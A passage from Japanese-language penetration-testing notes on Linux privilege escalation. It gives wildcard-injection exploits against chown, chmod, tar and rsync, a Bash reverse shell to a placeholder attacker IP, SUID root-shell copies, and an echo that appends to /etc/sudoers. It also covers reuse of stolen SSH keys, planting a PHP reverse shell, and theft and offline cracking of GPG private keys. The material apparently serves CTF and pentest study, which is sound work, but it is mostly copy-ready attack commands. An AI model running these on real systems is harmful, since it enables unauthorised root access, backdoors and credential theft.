応用：シンボリックリンクと組み合わせることで、`/etc/shadow`などの重要ファイルの所有者も奪取可能
```bash
ln -s /etc/shadow .drf.php
```

### Chmod File Reference Trick（権限ハイジャック）

#### 仕組み

`chmod`の`--reference`オプションを悪用し、指定ファイルの権限を参照させる
```
--reference=RFILE
    MODE値の代わりにRFILEのモード（権限）を使用
```

#### エクスプロイト手順

1. 書き込み可能なディレクトリに 任意の権限を持つダミー参照ファイルを作成
```bash
# 攻撃者が777権限のファイルを作成
touch .drf.php
chmod 777 .drf.php
```

2. `--reference`オプションファイルを作成
```bash
touch -- '--reference=.drf.php'
```

3. rootが権限変更を実行すると...
```bash
# rootの意図：すべてのファイルを000（アクセス不可）に変更
chmod 000 *

# 実際の展開：
# chmod 000 file1.php file2.php ... --reference=.drf.php
```
- →すべてのファイルが777権限になる

応用：`-R`ファイルも作成すれば、サブディレクトリも再帰的に権限変更可能
```bash
touch -- '-R'
```

### Tar Arbitrary Command Execution（任意コマンド実行）

#### 仕組み

`tar`の`--checkpoint-action`オプションを悪用し、チェックポイント到達時に任意コマンドを実行
```
--checkpoint[=NUMBER]
    NUMBERレコードごとに進捗メッセージを表示（デフォルト10）

--checkpoint-action=ACTION
    各チェックポイントでACTIONを実行
```

#### エクスプロイト手順（Wildcard Injection版）

1. 書き込み可能なディレクトリに悪意あるシェルスクリプトを作成
```zsh
cat > shell.sh << 'EOF'
#!/bin/bash
/bin/bash -i >& /dev/tcp/<attacker_IP>/<Port> 0>&1
EOF
chmod +x shell.sh
```
- もしくは
```zsh
cat > shell.sh << 'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash
EOF
chmod +x shell.sh
```

2. `--checkpoint=1`ファイルを作成（1レコードごとに実行）
```bash
echo "" > "--checkpoint=1"
# または
echo "" > --checkpoint=1
```

3. `--checkpoint-action`ファイルを作成
```bash
echo "" > "--checkpoint-action=exec=sh shell.sh"
```

4. rootがtarを実行すると...
```bash
# rootの意図：アーカイブ作成または展開
tar cf archive.tar *
# または
tar -zxf /tmp/backup.tar.gz *

# 実際の展開：
# tar cf archive.tar file1 file2 ... --checkpoint=1 --checkpoint-action=exec=sh shell.sh
```
- → 1レコードごとにshell.shがroot権限で実行される

---

### Rsync Arbitrary Command Execution（任意コマンド実行）

#### 仕組み

`rsync`の`-e`オプションを悪用し、リモートシェルとして任意コマンドを実行
```
-e, --rsh=COMMAND
    使用するリモートシェルを指定
```

#### エクスプロイト手順

1. 書き込み可能なディレクトリに悪意あるシェルスクリプトを作成
```bash
cat > shell.c << 'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash
EOF

chmod +x shell.c
```

2. `-e`オプションファイルを作成
```bash
touch -- '-e sh shell.c'
```

3. rootがrsyncを実行すると...
```bash
# rootの意図：すべての.cファイルをリモートにコピー
rsync -t *.c foo:src/

# 実際の展開：
# rsync -t -e sh shell.c <他のファイル> foo:src/
```
- → shell.cがシェルスクリプトとしてroot権限で実行される

4. 権限昇格
```bash
/tmp/rootbash -p  # root権限取得
```

---
---

# Misc

##  `sudo`と`su`によるPrivEsc

```zsh
sudo su
su root
```

---

## /etc/sudoersの書き込み

- `/etc/sudoers`に任意のユーザー名を追記し、すべての権限を付与すれば、sudoユーザーとなる
- GTFOBinsで`LFILE='/path/to/file_to_write'`となっているとき等にこのテクニックを使う
```zsh
# 基本原理
echo '<username> ALL=(ALL:ALL) ALL' >> /etc/sudoers
sudo su

# 具体例
LFILE='/etc/sudoers'

dosbox -c 'mount c /' -c "echo commander ALL=(ALL:ALL) ALL >> C:$LFILE" -c exit
sudo su
```

---

## SSHキーによるPrivEsc

```zsh
# ターゲットマシン上でssh keyの中身を表示
cat <ssh_key>
```
```zsh
# 攻撃者マシン上でキーをコピーしたファイルを作成し、ターゲットにrootで接続
echo '<ssh_key>' > ssh.key
chmod 600 ssh.key
ssh -i ssh.key -oPubkeyAcceptedKeyTypes=+ssh-rsa -oHostKeyAlgorithms=+ssh-rsa root@<target_IP>
```

---

## Webサーバを起動できるとき

1. 攻撃者上でリバースシェルを用意
2. ターゲットの`xx/phpMyAdmin/tmp/`等の書き込み可能、かつWebサーバーのディレクトリに🔗[php-reverse-shell-payload - GitHub](https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php)を配置
3. Webサーバーを起動（要root権限）
```zsh
# openbsd
doas service apache24 onestart

# debian
sudo systemctl start apache2
```

3. ターゲットのローカルで動作しているapacheにリクエスト
```zsh
curl http://127.0.0.1/phpMyAdmin/tmp/backdoor.php
```

---

## GPG

### GPGとは

- GPG (GNU Privacy Guard) は、データの暗号化と署名のためのオープンソースツールであり、公開鍵暗号方式を使用し、以下の用途がある：
	- ファイルやメールの暗号化
	- デジタル署名による認証
	- 鍵管理
- gpg-agentは、GPG秘密鍵のパスフレーズをメモリにキャッシュし、一定期間再入力を不要にするデーモン
- `.gpg`には主に以下の３種類がある（`file <file>`の出力）

| ファイルタイプ | 読み取り方           | 用途           | fileコマンド出力                                       |
| ------- | --------------- | ------------ | ------------------------------------------------ |
| 暗号化ファイル | `gpg --decrypt` | 機密データの保護（重要） | GPG symmetrically encrypted data (AES256 cipher) |
| 公開鍵リング  | `gpg --import`  | 公開鍵の保管（無視）   | PGP/GPG key public ring                          |
| 秘密鍵リング  | `gpg --import`  | 署名偽装や他データの復号 | PGP/GPG key security ring                        |

### 秘密鍵の窃取と解析

- `~/.gnupg/secring.gpg` (旧) や `~/.gnupg/private-keys-v1.d/` (新) を奪取する
- 奪取した秘密鍵に対して、`gpg2john` でハッシュ化し、`john` や `hashcat` でパスフレーズをオフライン攻撃する

[Cronの列挙コマンド](🔍Linux%20Enumeration.md#Cronの列挙コマンド)

### 秘密鍵をインポート→暗号ファイルの復号

1. 秘密鍵があるか確認
```zsh
gpg --list-secret-keys
```

2. 秘密鍵をインポート
```zsh
gpg --import <stolen_key>
```

3. 暗号化されたファイルを復号
```zsh
gpg --decrypt <file>.gpg
```
- このとき、キャッシュが効いていればパスフレーズ入力なしで中身が表示される

### LinPEASでの表示

```zsh
╔══════════╣ Analyzing PGP-GPG Files (limit 70)
/usr/bin/gpg
netpgpkeys Not Found
netpgp Not Found

-rw-r--r-- 1 root root 2796 Mar 29  2021 /etc/apt/trusted.gpg.d/ubuntu-keyring-2012-archive.gpg
-rw-r--r-- 1 root root 0 Jan 17  2018 /snap/core18/2566/usr/share/keyrings/ubuntu-cloudimage-removed-keys.gpg
```

> [!TIP]
> `/usr/share/keyrings` 配下や `ubuntu-keyring...` といったファイルは公開鍵リングなので、調査対象から除外してよい

---
---

# 参考リンク

- 🔗[PayloadAllTheThings - Linux Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)


